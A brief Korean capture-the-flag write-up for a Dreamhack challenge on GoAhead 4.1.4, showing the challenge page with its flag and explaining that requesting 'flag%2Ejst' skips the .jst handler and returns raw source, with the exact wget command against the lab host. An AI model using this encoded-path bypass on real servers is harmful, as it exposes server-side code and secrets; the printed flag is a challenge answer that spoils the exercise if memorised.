## 코드

```html
<html>
	<body>
		<h1>Can you see flag?</h1>
		<% write("read me"/*this is flag DH{703ab75ab49d02bd4d7abdcb4e7ba39c}*/); %>
	</body>
</html>
```

## 풀이

도커파일 및 문제 설명에 goahead 4.1.4 버전을 사용한다고 나와있으며,

[https://github.com/embedthis/goahead/issues/300](https://github.com/embedthis/goahead/issues/300)

이런식으로 goahead에 대한 취약점 패치 내역이 친절하게 나와있다.

대충 이해해보자면 jst 파일을 핸들링하는 함수가 있는데, 이때 파일 경로를 flag.jst 대신 flag%2Ejst로 하면 jst 핸들러가 동작하지 않아 처리하기 전 파일을 받을 수 있다.

크롬에서 이를 실행하면 알아서 .로 바꿔주기 때문에, 

```bash
$ wget http://host1.dreamhack.games:10508/jst/flag%2Ejst 
```

를 실행하니까 flag를 주석처리하기 전 내용을 얻을 수 있었다.